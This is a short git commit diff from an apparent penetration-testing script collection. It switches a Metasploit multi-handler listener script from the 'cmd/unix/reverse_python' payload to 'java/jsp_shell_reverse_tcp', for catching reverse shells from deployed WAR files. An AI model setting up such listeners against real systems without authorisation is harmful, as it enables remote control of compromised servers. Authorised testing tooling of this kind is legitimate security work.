e5226fed6f033836dba9a88f39de37bf74a23287
Danny van der Knaap <dvdknaap@users.noreply.github.com>
2025-04-03 15:15:10 -0400

    feat(bash): new scripts (#123)

--- code/xdotool/scripts/shell/msfconsole/listen_to_meterpreter_war_rev_shell.sh
+++ code/xdotool/scripts/shell/msfconsole/listen_to_meterpreter_war_rev_shell.sh
@@ -6,6 +6,6 @@ meterpreter: start meterpreter listener java/jsp_shell_reverse_tcp
 
 source ${SCRIPTS_DIR}/shell/msfconsole/.files/listen_to_meterpreter_rev_shell.sh
 
-PAYLOAD="cmd/unix/reverse_python"
+PAYLOAD="java/jsp_shell_reverse_tcp"
 
 create_meterpreter_multi_handler "${PAYLOAD}"
